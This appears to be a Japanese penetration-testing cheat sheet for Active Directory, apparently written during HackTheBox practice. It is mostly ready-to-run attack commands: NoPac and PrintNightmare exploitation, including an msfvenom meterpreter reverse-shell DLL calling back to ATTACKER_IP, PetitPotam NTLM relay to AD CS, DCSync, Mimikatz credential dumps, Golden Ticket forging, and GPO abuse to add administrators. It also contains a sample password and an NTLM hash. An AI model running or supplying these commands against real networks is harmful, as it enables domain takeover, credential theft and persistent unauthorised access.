┌──(venv)─(kali㉿kali)-[~/Desktop/HTB/BabyTwo/pyGPOAbuse]
└─$ python pygpoabuse.py baby2.vl/GPOADM:SuperPass123! -gpo-id 31B2F340-016D-11D2-945F-00C04FB984F9 -command 'net localgroup administrators GPOADM /add' -f
[+] ScheduledTask TASK_c0847a16 created!
```

## 脆弱性利用
### NoPac
SamAccountName Spoofing - CVE-2021-42278 & CVE-2021-42287
ドメインユーザーからドメイン管理者へ昇格可能な脆弱性を悪用
- スキャン
```shell
sudo python3 scanner.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -use-ldap
```
- SYSTEMシェル取得
```shell
sudo python3 noPac.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -dc-host <DC_HOSTNAME> -shell --impersonate administrator -use-ldap
```
### PrintNightmare 
RCE via Print Spooler - CVE-2021-34527, CVE-2021-1675
プリントスプーラーサービスの脆弱性を利用してリモートコード実行や権限昇格
- RPC確認
```shell
rpcdump.py @<DC_IP> | egrep 'MS-RPRN|MS-PAR'
```
- DLLペイロード作成 
```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f dll > payload.dll
```
- SMB共有 
```shell
sudo smbserver.py -smb2support SHARE_NAME /path/to/payload_dll_folder/
```
- エクスプロイト実行
```shell
sudo python3 CVE-2021-1675.py <DOMAIN>/<USER>:<PASSWORD>@<DC_IP> '\\\\<ATTACKER_IP>\\SHARE_NAME\\payload.dll'
```
### PetitPotam
NTLM Relay via MS-EFSRPC -> AD CS -> DC Cert -> DCSync
MS-EFSRPCプロトコルを悪用してNTLMリレーを行い、AD CS経由でDCの証明書を取得しDCSyncへ
- NTLMリレー (ntlmrelayx.py)
```shell
sudo ntlmrelayx.py -debug -smb2support --target http://<CA_SERVER_FQDN>/certsrv/certfnsh.asp --adcs --template DomainController
```
- PetitPotamトリガー
```shell
python3 PetitPotam.py <ATTACKER_IP_FOR_NTLMRELAYX> <DC_IP_TO_COERCE>
```
- 証明書からTGT取得 (gettgtpkinit.py)
```shell
python3 /opt/PKINITtools/gettgtpkinit.py <DOMAIN>/<DC_HOSTNAME>\$ -pfx-base64 <BASE64_CERT> dc_ticket.ccache
```
- TGTでDCSync 
```shell
export KRB5CCNAME=dc_ticket.ccache;
```

```shell
secretsdump.py -k -no-pass -just-dc-user <DOMAIN>/administrator "<DC_HOSTNAME>\$"@<DC_FQDN>
```
### MS14-068 
Kerberos PAC偽造
KerberosチケットのPAC（特権属性証明書）を偽造し、ドメイン管理者へ昇格する脆弱性 (PyKEK, Impacket)

## その他の設定ミス悪用
### PASSWD_NOTREQD フラグ
パスワードが不要に設定されているアカウントの悪用
- PowerView
```powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD
```
- (空パスワード等でログイン試行)
### グループポリシー設定（GPP）によるパスワードの漏洩
グループポリシー設定に保存された暗号化パスワード（復号可能）の悪用
- CrackMapExec
```shell
crackmapexec smb <DC_IP> -u <USER> -p <PASSWORD> -M gpp_password
```
- 手動復号 (gpp-decrypt)
```shell
gpp-decrypt <CPASSWORD_FROM_XML>
```
### 説明欄に書かれたパスワード
ユーザーアカウントの説明欄などに不用意に記載されたパスワードの探索
- PowerView
```powershell
Get-DomainUser - | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
```
### SYSVOLスクリプト内の認証情報
SYSVOL共有内のスクリプトにハードコードされた認証情報の探索
- SYSVOL共有 (`\\<DC_IP>\SYSVOL\<DOMAIN_FQDN>\scripts`) 内のスクリプトを確認
### Exchange関連グループメンバーシップ 
PrivExchange等
Exchange関連の特権グループ ("Exchange Windows Permissions", "Organization Management") の悪用
### プリンタバグ 
MS-RPRN
プリントスプーラープロトコルの欠陥を利用し、サーバーに任意ホストへの認証を強制（LDAPリレーなど）
### LDAP認証情報スニッフィング
アプリケーションやプリンタのWeb管理コンソールからLDAP認証情報を窃取

# Post Privilege Escatlation

## DCSync 
ドメイン全体のハッシュ取得
### secretsdump.py 
DS-Replication-Get-Changes権限を悪用し、ドメインコントローラーから全ユーザーのNTLMハッシュなどを取得
- パスワード使用
```shell
impacket-secretsdump -just-dc -outputfile domain_hashes <DOMAIN>/<DA_USER>@<DC_IP>
```
- NTLMハッシュ使用
```shell
impacket-secretsdump -just-dc -outputfile domain_hashes -hashes <LMHASH:NTHASH> <DOMAIN>/<DA_USER>@<DC_IP>
```
- Kerberosチケット使用
```shell
export KRB5CCNAME=<TICKET.CCACHE>;
```

```shell   
secretsdump.py -k -no-pass -just-dc <DOMAIN>/<DA_USER_IMPERSONATED>@<DC_IP>
```
### Mimikatz
ドメイン管理者権限のコンテキストで実行し、DCSync攻撃
```powershell
privilege::debug
lsadump::dcsync /domain:<DOMAIN_FQDN> /all /csv
lsadump::dcsync /domain:<DOMAIN_FQDN> /user:krbtgt
```

## Mimikatz
メモリから認証情報ダンプ
ローカルシステムのメモリから平文パスワード、NTLMハッシュ、Kerberosチケットなどを抽出
```sh
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "sekurlsa::logonpasswords" "sekurlsa::tickets /export" "lsadump::lsa" "lsadump::secrets" "exit" > mimikatz_full_dump.txt
```

一行ずつやりたい時は
```powershell
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets /export
lsadump::lsa
lsadump::secrets
```

## Golden Ticket 
永続的ドメイン管理者アクセス
ドメインのKRBTGTアカウントのハッシュを使用して、任意のユーザーとして長期間有効なTGTを偽造
- KRBTGTハッシュはDCSyncで取得
- Mimikatz (Windows)
```powershell
kerberos::golden /user:<ADMIN_USER_TO_CREATE> /domain:<DOMAIN_FQDN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt
```

## WinPEAS
Windowsホスト上で実行し、権限昇格や横展開に繋がる可能性のある情報を広範囲に収集
```powershell
# 色付きで見る方法
.\winPEASx64.exe ansi > winpeas_ansi.txt
```

リソースが足りなくて落ちる時はこれ
```sh
Start-Process -FilePath "C:\Users\wario\Documents\winPEASx64.exe" -ArgumentList "all" -RedirectStandardOutput "C:\Users\wario\Documents\winpeas_output.txt" -NoNewWindow
```

```sh
Start-Process -FilePath "C:\Users\Administrator\Desktop\winPEASx64.exe" -RedirectStandardOutput "C:\Users\Administrator\Desktop\winpeas_output.txt" -NoNewWindow
```
## impacket-secretsdump
```sh
impacket-secretsdump -hashes :b2c03054c306ac8fc5f9d188710b0168 Administrator@192.168.191.121
```

## LaZagne.exe
```sh
.\LaZagne.exe all
```


## WinRMを有効にする
WinRMを有効化するGPOを作成
```sh
New-GPO -Name "Enable WinRM" | New-GPLink -Target "OU=Computers,DC=domain,DC=com"
```
